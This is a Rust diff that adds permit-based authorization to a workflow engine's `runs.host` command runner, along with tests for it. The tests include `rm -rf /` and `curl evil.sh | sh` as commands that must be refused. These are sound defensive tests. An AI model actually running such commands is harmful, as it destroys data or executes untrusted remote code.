@@ -8,10 +8,13 @@
 //! Note precisely what that buys, because it differs per capability: `state` is genuinely ABSENT
 //! from the guest realm (`cyrup-workflow-runtime`'s `js/prelude.js:578`), while keyed resume is
 //! PRESENT AND REFUSING (`engine.rs:1105`, `:1908`). `runs.steer` is now wired (WORKFLOW_14) and
-//! `runs.host` is now wired (WORKFLOW_19) — [`WorkflowScriptHost::supports_host`] is what installs
-//! the guest property at all (`prelude.js:574` deletes it when the flag is false), so flipping it
-//! is not a refinement of the refusal, it is the difference between a verb and a `TypeError`. Do
-//! not describe all four as "absent".
+//! `runs.host` is wired (WORKFLOW_19) but AUTHORITY-GATED (SUBA-174): it is present on the guest
+//! surface for every run, exactly as upstream installs it unconditionally
+//! (`scripted-workflow.ts:809-812` @v0.75.0), and [`WorkflowScriptHost::supports_host`] decides
+//! whether the op is LINKED — upstream's `options.host` presence (`subagent-executor.ts:5965-5967`,
+//! `:6395-6399`). An unlinked run gets the engine's verbatim `runs.host is unavailable in this host
+//! context.` (`scripted-workflow.ts:2498`), NOT a `TypeError`. Do not describe all four as
+//! "absent".
 
 use std::collections::HashMap;
 use std::collections::hash_map::Entry;
@@ -257,6 +260,43 @@ pub(crate) struct WorkflowRunHost {
     /// `tokio::sync::Mutex` because it is held across the `.await` on the write; the two `std`
     /// mutexes above are not.
     publish_lock: tokio::sync::Mutex<()>,
+    /// SUBA-174 — this run's RESOURCE PROVENANCE, and the whole of its `runs.host` authority.
+    ///
+    /// `Some` exactly when the `workflow` field named an extension-owned resource whose permit was
+    /// CONSUMED against the script this host is driving; `None` for a raw script (a reply block, a
+    /// script file, a scheduled fire). Upstream's two facts — `workflowResource` presence and
+    /// `workflowResource.permit` — are ONE value here, because presence IS the provenance: a run
+    /// without a permit has nothing to authorize with, so no forgotten check can hand it authority.
+    ///
+    /// Not `Clone`, not `Deserialize`, private fields, one constructor
+    /// ([`crate::workflows::WorkflowResourcePermit`]) — a guest script cannot mint one, and it
+    /// never travels through the JSON request map the script could influence. It reaches this host
+    /// by MOVE from `lower_workflow_field`'s resolver call, which is the only producer.
+    resource: Option<crate::workflows::WorkflowResourcePermit>,
+}
+
+/// Everything [`WorkflowRunHost::new`] needs, as one named bundle.
+///
+/// A struct rather than an eighth positional parameter: the field that was added last is the one
+/// that must never be defaulted away, and `resource: None` has to be a thing a caller WRITES.
+pub(crate) struct NewWorkflowRunHost {
+    /// The executor handle every child launch rides.
+    pub(crate) executor: Arc<SubagentExecutor>,
+    /// The request cwd, already resolved by `Tool::execute`.
+    pub(crate) cwd: PathBuf,
+    /// The host update sink. MOVED in, not cloned (see [`SharedUpdateSink`]).
+    pub(crate) on_update: ToolUpdateSink,
+    /// The ONE workflow run id for the whole call.
+    pub(crate) workflow_run_id: crate::background::RunId,
+    /// The shared run record this workflow is writing.
+    pub(crate) status: Arc<Mutex<crate::background::RunStatus>>,
+    /// The workflow's own run directory.
+    pub(crate) run_dir: PathBuf,
+    /// The async root any workflow receipt may be found under.
+    pub(crate) async_root: PathBuf,
+    /// SUBA-174 — the CONSUMED resource permit, or `None` for a raw script. See
+    /// [`WorkflowRunHost::resource`].
+    pub(crate) resource: Option<crate::workflows::WorkflowResourcePermit>,
 }
 
 impl WorkflowRunHost {
@@ -265,15 +305,17 @@ impl WorkflowRunHost {
     /// `on_update` is MOVED in, not cloned: the tool call owns exactly one host sink, and the
     /// `Arc<Mutex<…>>` wrap performed here is what lets every child borrow a forwarding share of
     /// it (see [`SharedUpdateSink`]).
-    pub(crate) fn new(
-        executor: Arc<SubagentExecutor>,
-        cwd: PathBuf,
-        on_update: ToolUpdateSink,
-        workflow_run_id: crate::background::RunId,
-        status: Arc<Mutex<crate::background::RunStatus>>,
-        run_dir: PathBuf,
-        async_root: PathBuf,
-    ) -> Self {
+    pub(crate) fn new(input: NewWorkflowRunHost) -> Self {
+        let NewWorkflowRunHost {
+            executor,
+            cwd,
+            on_update,
+            workflow_run_id,
+            status,
+            run_dir,
+            async_root,
+            resource,
+        } = input;
         Self {
             executor,
             cwd,
@@ -287,6 +329,7 @@ impl WorkflowRunHost {
             async_root,
             next_child_index: AtomicUsize::new(0),
             publish_lock: tokio::sync::Mutex::new(()),
+            resource,
         }
     }
 
@@ -1312,21 +1355,37 @@ impl WorkflowScriptHost for WorkflowRunHost {
         }
     }
 
-    /// WORKFLOW_19 — the guest sees `runs.host` ONLY because of this flag.
+    /// SUBA-174 — whether the `runs.host` op is LINKED for this run: upstream's `options.host`
+    /// presence, decided at `subagent-executor.ts:5965-5967` / `:6395-6399` @v0.75.0.
     ///
-    /// `prelude.js:574` is `if (!hostEnabled) delete surface.host;`, and `hostEnabled` is read off
-    /// this method (`engine.rs`'s `shared.host.supports_host()` at install time). So while
-    /// [`Self::host_command`] without this would be dead code, this without
-    /// [`Self::host_command`] would be worse than dead: the property would exist and every call
-    /// would take the trait default's `runs.host is unavailable in this host context.` The two
-    /// land together, as `supports_steer`/`steer` did.
+    /// Upstream composes two facts into that one decision:
     ///
-    /// It is true unconditionally because its two prerequisites are unconditional for a
-    /// foreground workflow: a resolved request cwd (`self.cwd`, `extension/tool/mod.rs:205`) to
-    /// run the command in, and a real run directory (`self.run_dir`, WORKFLOW_13) to write the
-    /// default capture into. Neither is optional at this point in the call.
+    /// ```text
+    /// workflowHost = workflowResource
+    ///   ? workflowResource.authority.host ? runHostCommand : undefined
+    ///   : publicExecution ? undefined : runHostCommand;
+    /// ```
+    ///
+    /// The second arm is `undefined` for every run cyrup can produce. Both of this crate's
+    /// `drive_workflow_run` callers are upstream `executePublic` runs — the tool call through
+    /// `Tool::execute`, and the scheduled fire, whose upstream analogue `executeScheduled`
+    /// delegates straight to `executePublic` (`subagent-executor.ts:8011`) and so is marked in the
+    /// same `publicExecutions` set (`:7960`). cyrup has no `executeDelegated` workflow path, and
+    /// `one_use_permit` is always `None`, which is upstream's third gate
+    /// (`delegatedWorkflowPermit ? undefined : …`, `:6395`). So the decision reduces to the first
+    /// arm, and this method IS that arm: a resource whose permit declares a host grant list.
+    ///
+    /// **This returned `true` unconditionally before SUBA-174, and that was the defect.** Its two
+    /// stated prerequisites (a resolved cwd, a real run dir) are indeed unconditional — they are
+    /// what makes the verb *implementable*, never what makes it *authorized*.
+    ///
+    /// It reads the permit rather than a `bool` threaded beside it on purpose: `None` is not a
+    /// flag that can be set, it is the absence of the only thing [`Self::host_command`] could
+    /// authorize against.
     fn supports_host(&self) -> bool {
-        true
+        self.resource
+            .as_ref()
+            .is_some_and(crate::workflows::WorkflowResourcePermit::grants_host)
     }
 
     /// `runs.host(key, params)` — run a gate/CI command on the host and hand the script its
@@ -1354,6 +1413,27 @@ impl WorkflowScriptHost for WorkflowRunHost {
         // `execute_workflow_host_command` runs `ContainedPath::assert_within(cwd, …)` against it
         // before and after the spawn. Handing it a different root than the command's own working
         // directory would make "relative to the cwd" mean two things at once.
+        // SUBA-174 — THE AUTHORITY GATE, upstream's `authorize` hook on
+        // `workflowHostCommandRunner` (`subagent-executor.ts:3704-3705`: `const
+        // authorizationError = input.authorize?.(key, params); if (authorizationError) throw new
+        // Error(authorizationError);`), wired for exactly the runs upstream wires it for
+        // (`:5966`/`:6398`, the `workflowResource ? { authorize: … } : {}` spread).
+        //
+        // FIRST, before the cwd and the capture path are even read: an unauthorized key must not
+        // claim an output path, mint a directory or spawn anything.
+        //
+        // `authorize_host` is the WHOLE decision and is NOT re-implemented here — it is a pure
+        // function of (permit, key, command) in `workflows/permit.rs`, with upstream's three
+        // refusals verbatim. This method's only job is to REACH it, and to fail closed when there
+        // is no permit at all: `supports_host` already returned `false` in that case, so the
+        // engine refused at the op (`engine.rs`'s `runs.host is unavailable in this host
+        // context.`) and this arm is unreachable defence in depth — the same sentence, so the two
+        // layers cannot disagree about what the script is told.
+        match self.resource.as_ref() {
+            Some(permit) => permit.authorize_host(key, &params.command)?,
+            None => return Err("runs.host is unavailable in this host context.".to_string()),
+        }
+
         let cwd = self.cwd.as_path();
 
         // The default capture destination, which nothing but this host can mint: it is used only
@@ -1419,24 +1499,112 @@ mod tests {
 
     use super::*;
 
-    /// A bare host rooted at a REAL `cwd` and `run_dir` — what `runs.host` needs, since it spawns
-    /// a process in the one and writes its capture into the other.
-    fn host_rooted_at(cwd: PathBuf, run_dir: PathBuf) -> WorkflowRunHost {
+    /// A host rooted at a REAL `cwd` and `run_dir` — what `runs.host` needs, since it spawns a
+    /// process in the one and writes its capture into the other — carrying `resource` as its
+    /// `runs.host` authority.
+    fn host_rooted_with(
+        cwd: PathBuf,
+        run_dir: PathBuf,
+        resource: Option<crate::workflows::WorkflowResourcePermit>,
+    ) -> WorkflowRunHost {
         let workflow_run_id = crate::background::RunId::new();
         let status = Arc::new(Mutex::new(crate::background::RunStatus::queued(
             workflow_run_id.clone(),
             crate::background::RunMode::Workflow,
             None,
         )));
-        WorkflowRunHost::new(
-            Arc::new(SubagentExecutor::new()),
+        WorkflowRunHost::new(NewWorkflowRunHost {
+            executor: Arc::new(SubagentExecutor::new()),
             cwd,
-            Box::new(|_| {}),
+            on_update: Box::new(|_| {}),
             workflow_run_id,
             status,
-            run_dir.clone(),
-            run_dir,
+            run_dir: run_dir.clone(),
+            async_root: run_dir,
+            resource,
+        })
+    }
+
+    /// SUBA-174 — the permit a real `run-ci` resolution produces, CONSUMED against the script it
+    /// attests to, which is the only state `authorize_host` will speak for.
+    ///
+    /// Built through the production registry rather than by hand, so a test can never grant itself
+    /// an authority `resolve_run_ci` would not issue.
+    fn consumed_resource_permit(
+        name: &str,
+        args: serde_json::Value,
+    ) -> (String, crate::workflows::WorkflowResourcePermit) {
+        let registry = crate::workflows::WorkflowResourceRegistry::default();
+        // `resolve` returns `WorkflowResourceResolution`, a domain enum and NOT a `Result`, so
+        // there is nothing to unwrap here — the `let ... else` below is what refuses a resolution
+        // that did not succeed, and it names the resource in the panic.
+        let resolved = registry.resolve(
+            &serde_json::Value::String(name.to_string()),
+            Some(&args),
+            None,
+        );
+        let crate::workflows::WorkflowResourceResolution::Ok(resolved) = resolved else {
+            panic!("builtin '{name}' must resolve: {resolved:?}");
+        };
+        let mut permit = resolved.permit;
+        permit
+            .consume(&resolved.script)
+            .expect("a fresh permit consumes");
+        (resolved.script, permit)
+    }
+
+    /// A host carrying the `run-ci` builtin's consumed permit, plus the script that resolution
+    /// produced.
+    fn host_with_run_ci(
+        cwd: PathBuf,
+        run_dir: PathBuf,
+        args: serde_json::Value,
+    ) -> (String, WorkflowRunHost) {
+        let (script, permit) = consumed_resource_permit("run-ci", args);
+        (script, host_rooted_with(cwd, run_dir, Some(permit)))
+    }
+
+    /// The old helper's shape, now explicit that it grants NO host authority.
+    fn host_rooted_at(cwd: PathBuf, run_dir: PathBuf) -> WorkflowRunHost {
+        host_rooted_with(cwd, run_dir, None)
+    }
+
+    /// SUBA-174 — a host whose resource permit grants exactly `grants`, issued through the
+    /// production [`crate::workflows::WorkflowResourcePermit`] API (what a session-registered
+    /// resource's authority is) and CONSUMED, which is the only state `authorize_host` speaks for.
+    ///
+    /// The runner tests below are about the COMMAND RUNNER (capture paths, exit codes, timeouts,
+    /// cancellation), so each one now has to say out loud which key/command its resource granted —
+    /// which is the point: there is no longer a host that will run an arbitrary command.
+    fn host_granting(cwd: PathBuf, run_dir: PathBuf, grants: &[(&str, &str)]) -> WorkflowRunHost {
+        const SCRIPT: &str = "return null;";
+        let host = grants
+            .iter()
+            .map(
+                |(key, command)| crate::workflows::WorkflowResourceHostAuthority {
+                    key: crate::workflows::WorkflowKey::parse(key).expect("a safe grant key"),
+                    command: (*command).to_string(),
+                },
+            )
+            .collect::<Vec<_>>();
+        let mut permit = crate::workflows::WorkflowResourcePermit::issue(
+            crate::workflows::WorkflowResourcePermitInput {
+                resource_name: crate::workflows::WorkflowKey::parse("fixture")
+                    .expect("a safe resource name"),
+                resource_version: 1,
+                resource_id: crate::workflows::WorkflowResourceId::parse(
+                    "11111111-2222-4333-8444-555555555555",
+                )
+                .expect("a well-formed resource id"),
+                script_digest: crate::workflows::stable_json_digest(&Value::String(
+                    SCRIPT.to_string(),
+                )),
+                authority: crate::workflows::WorkflowResourceAuthority { host: Some(host) },
+            },
         )
+        .expect("the fixture authority is valid");
+        permit.consume(SCRIPT).expect("a fresh permit consumes");
+        host_rooted_with(cwd, run_dir, Some(permit))
     }
 
     /// The normalizer's OUTPUT, as the engine hands it to the host — never a hand-rolled shape the
@@ -2088,14 +2256,186 @@ mod tests {
     // WORKFLOW_19 — `runs.host`
     // --------------------------------------------------------------------------------------
 
-    /// DoD 1: the flag is what installs the guest property at all. With it false `prelude.js:574`
-    /// deletes `runs.host` and the script gets a `TypeError`, not upstream's refusal string — so
-    /// this assertion is the difference between the verb existing and not existing.
+    /// SUBA-174 — `supports_host` is upstream's `options.host` DECISION, so it must disagree
+    /// between a run with resource provenance and a run without it.
+    ///
+    /// This replaces an `assert!(host.supports_host())` over a provenance-less host, which passed
+    /// for the one reason the row names: the method returned a constant. A predicate test cannot
+    /// catch that, which is why the headline behaviour is also proved from a real engine run
+    /// through the real dispatch —
+    /// [`crate::extension::tool::routing::tests::a_raw_script_file_is_refused_runs_host_at_the_dispatch`],
+    /// which is the only test that exercises `supports_host` the way the ENGINE consults it
+    /// (`scripted/engine.rs`'s `run_host_command` gate). The cases here and the ones below call
+    /// [`WorkflowRunHost::host_command`] directly and so reach only the defence-in-depth arm
+    /// inside the method.
     #[test]
-    fn the_host_surface_is_advertised() {
+    fn supports_host_tracks_resource_provenance_and_nothing_else() {
         let dir = tempfile::tempdir().expect("tempdir");
-        let host = host_rooted_at(dir.path().to_path_buf(), dir.path().join("wf"));
-        assert!(host.supports_host());
+        let raw = host_rooted_at(dir.path().to_path_buf(), dir.path().join("wf"));
+        assert!(
+            !raw.supports_host(),
+            "a run with no resource permit has no host authority to link the op with"
+        );
+
+        let granted = host_granting(
+            dir.path().to_path_buf(),
+            dir.path().join("wf"),
+            &[("ci", "npm test")],
+        );
+        assert!(
+            granted.supports_host(),
+            "a resource whose permit declares a grant list links the op"
+        );
+
+        // A resource that declared NO grant list at all — upstream's
+        // `workflowResource.authority.host ? runHostCommand : undefined` falsy arm (`:5966`). The
+        // `review` builtin is exactly this shape, and it is the case a `bool` threaded beside the
+        // run would collapse into "has a resource".
+        let (_script, permit) =
+            consumed_resource_permit("review", serde_json::json!({ "task": "look at the diff" }));
+        let ungranted = host_rooted_with(
+            dir.path().to_path_buf(),
+            dir.path().join("wf"),
+            Some(permit),
+        );
+        assert!(
+            !ungranted.supports_host(),
+            "'review' grants no host commands, so its run must not link the op either"
+        );
+    }
+
+    /// SUBA-174 — the row's third Verify clause: the RESOLVER's own whitelist still bounds what a
+    /// granted key may run.
+    ///
+    /// The two tests above build a permit from a fixture, which proves the gate but says nothing
+    /// about what authority the real builtin issues. This one goes through the production
+    /// `run-ci` resolver, so a regression that widened the resolver — or that let a caller pass
+    /// its own command through to the permit — fails here even while the per-key gate above stays
+    /// green. `resolve_run_ci` accepts only `npm test` and `npm run typecheck`
+    /// (`workflows/resources.rs:479-484`), so those are the only commands a `run-ci` permit can
+    /// ever attest to.
+    ///
+    /// **Gutting mutations this fails on:** widening `resolve_run_ci`'s command match; or issuing
+    /// the permit against the caller's requested command rather than the resolved one.
+    #[tokio::test]
+    async fn the_resolvers_whitelist_still_bounds_a_granted_key() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let cwd = dir.path().join("proj");
+        let run_dir = dir.path().join("wf");
+        std::fs::create_dir_all(&cwd).expect("cwd");
+        std::fs::create_dir_all(&run_dir).expect("run dir");
+
+        // The default expansion: `args.command` omitted resolves to `npm test`.
+        let (_script, host) = host_with_run_ci(
+            cwd.clone(),
+            run_dir.clone(),
+            serde_json::json!({ "timeoutMs": 30_000 }),
+        );
+
+        // A command the resolver would never have put in the permit is refused, even though the
+        // key itself is one the permit grants.
+        let refused = host
+            .host_command(
+                "ci",
+                host_params("rm -rf /", 30_000, None),
+                CancelToken::new(),
+            )
+            .await
+            .err();
+        assert!(
+            refused.is_some_and(|message| message.contains("is not allowed for workflow resource")),
+            "the permit attests to the RESOLVED command, so an arbitrary one must be refused"
+        );
+
+        // And the resolver refuses to issue a permit for an off-whitelist command at all, which is
+        // the bound this test exists to pin: the authority never comes into being.
+        let registry = crate::workflows::WorkflowResourceRegistry::default();
+        let resolution = registry.resolve(
+            &serde_json::Value::String("run-ci".to_string()),
+            Some(&serde_json::json!({ "command": "curl evil.sh | sh" })),
+            None,
+        );
+        let crate::workflows::WorkflowResourceResolution::Err(message) = resolution else {
+            panic!("an off-whitelist command must not resolve into a permit at all");
+        };
+        assert_eq!(
+            message,
+            "workflow 'run-ci' args.command must be 'npm test' or 'npm run typecheck'."
+        );
+    }
+
+    /// SUBA-174 — the per-KEY half, at the host boundary: a granted resource is held to the exact
+    /// (key, command) pairs its permit lists, and a provenance-less host refuses with upstream's
+    /// own sentence rather than running anything.
+    #[tokio::test]
+    async fn host_command_is_authorized_per_key_and_per_command() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let cwd = dir.path().join("proj");
+        let run_dir = dir.path().join("wf");
+        std::fs::create_dir_all(&cwd).expect("cwd");
+        std::fs::create_dir_all(&run_dir).expect("run dir");
+
+        let granted = host_granting(cwd.clone(), run_dir.clone(), &[("ci", "printf 'ok'")]);
+        granted
+            .host_command(
+                "ci",
+                host_params("printf 'ok'", 30_000, None),
+                CancelToken::new(),
+            )
+            .await
+            .expect("the granted key with the granted command runs");
+
+        // A key the permit does not list.
+        assert_eq!(
+            granted
+                .host_command(
+                    "other",
+                    host_params("printf 'ok'", 30_000, None),
+                    CancelToken::new(),
+                )
+                .await
+                .err()
+                .as_deref(),
+            Some(
+                "The command for runs.host('other') is not allowed for workflow resource \
+                 'fixture'."
+            )
+        );
+
+        // The granted key with a DIFFERENT command.
+        assert_eq!(
+            granted
+                .host_command(
+                    "ci",
+                    host_params("rm -rf /", 30_000, None),
+                    CancelToken::new(),
+                )
+                .await
+                .err()
+                .as_deref(),
+            Some("The command for runs.host('ci') is not allowed for workflow resource 'fixture'.")
+        );
+
+        // No provenance at all. Upstream's own decision, verified at the pin: `options.host` is
+        // `workflowResource ? (authority.host ? runHostCommand : undefined)
+        //                   : (publicExecution ? undefined : runHostCommand)`
+        // (`subagent-executor.ts:5965-5967`). BOTH of this crate's `drive_workflow_run` callers are
+        // upstream `executePublic` runs — the tool call, and the scheduled fire whose analogue
+        // `executeScheduled` delegates straight to `executePublic` (`:8011`), which adds its params
+        // to the `publicExecutions` set (`:7960`). So the second arm is `undefined` for every run
+        // cyrup can produce, and a raw script genuinely has no host op upstream either.
+        let raw = host_rooted_at(cwd, run_dir);
+        assert_eq!(
+            raw.host_command(
+                "ci",
+                host_params("printf 'ok'", 30_000, None),
+                CancelToken::new(),
+            )
+            .await
+            .err()
+            .as_deref(),
+            Some("runs.host is unavailable in this host context.")
+        );
     }
 
     /// The happy path, end to end through the real runner: a passing command settles `passed`, and
@@ -2109,7 +2449,11 @@ mod tests {
         let run_dir = dir.path().join("wf");
         std::fs::create_dir_all(&cwd).expect("cwd");
         std::fs::create_dir_all(&run_dir).expect("run dir");
-        let host = host_rooted_at(cwd.clone(), run_dir.clone());
+        let host = host_granting(
+            cwd.clone(),
+            run_dir.clone(),
+            &[("gate", "printf 'out'; printf 'err' >&2")],
+        );
 
         let result = host
             .host_command(
@@ -2147,7 +2491,7 @@ mod tests {
         let cwd = dir.path().join("proj");
         std::fs::create_dir_all(&cwd).expect("cwd");
         std::fs::write(cwd.join("marker.txt"), "here").expect("marker");
-        let host = host_rooted_at(cwd, dir.path().join("wf"));
+        let host = host_granting(cwd, dir.path().join("wf"), &[("gate", "cat marker.txt")]);
 
         let result = host
             .host_command(
@@ -2171,7 +2515,7 @@ mod tests {
         let dir = tempfile::tempdir().expect("tempdir");
         let cwd = dir.path().join("proj");
         std::fs::create_dir_all(&cwd).expect("cwd");
-        let host = host_rooted_at(cwd, dir.path().join("wf"));
+        let host = host_granting(cwd, dir.path().join("wf"), &[("bad", "exit 3")]);
 
         let result = host
             .host_command(
@@ -2199,7 +2543,7 @@ mod tests {
         let dir = tempfile::tempdir().expect("tempdir");
         let cwd = dir.path().join("proj");
         std::fs::create_dir_all(&cwd).expect("cwd");
-        let host = host_rooted_at(cwd, dir.path().join("wf"));
+        let host = host_granting(cwd, dir.path().join("wf"), &[("slow", "sleep 30")]);
 
         let result = host
             .host_command(
@@ -2235,7 +2579,11 @@ mod tests {
         let dir = tempfile::tempdir().expect("tempdir");
         let cwd = dir.path().join("proj");
         std::fs::create_dir_all(cwd.join("reports")).expect("cwd");
-        let host = host_rooted_at(cwd.clone(), dir.path().join("wf"));
+        let host = host_granting(
+            cwd.clone(),
+            dir.path().join("wf"),
+            &[("gate", "printf 'x'")],
+        );
 
         let result = host
             .host_command(
@@ -2266,7 +2614,7 @@ mod tests {
         let dir = tempfile::tempdir().expect("tempdir");
         let cwd = dir.path().join("proj");
         std::fs::create_dir_all(&cwd).expect("cwd");
-        let host = host_rooted_at(cwd, dir.path().join("wf"));
+        let host = host_granting(cwd, dir.path().join("wf"), &[("slow", "sleep 30")]);
         let cancel = CancelToken::new();
 
         let ticket = cancel.clone();
@@ -2359,15 +2707,17 @@ mod managed_workflow_worktree_tests {
         )));
         let run_dir = cwd.join(".runs");
         std::fs::create_dir_all(&run_dir).expect("run dir");
-        WorkflowRunHost::new(
+        WorkflowRunHost::new(NewWorkflowRunHost {
             executor,
-            cwd.to_path_buf(),
-            Box::new(|_| {}),
+            cwd: cwd.to_path_buf(),
+            on_update: Box::new(|_| {}),
             workflow_run_id,
             status,
-            run_dir.clone(),
-            run_dir,
-        )
+            run_dir: run_dir.clone(),
+            async_root: run_dir,
+            // These tests are about worktree ADMISSION, not `runs.host`; no authority is granted.
+            resource: None,
+        })
     }
 
     /// A scripted child that appends its own working directory to `record` and settles cleanly.
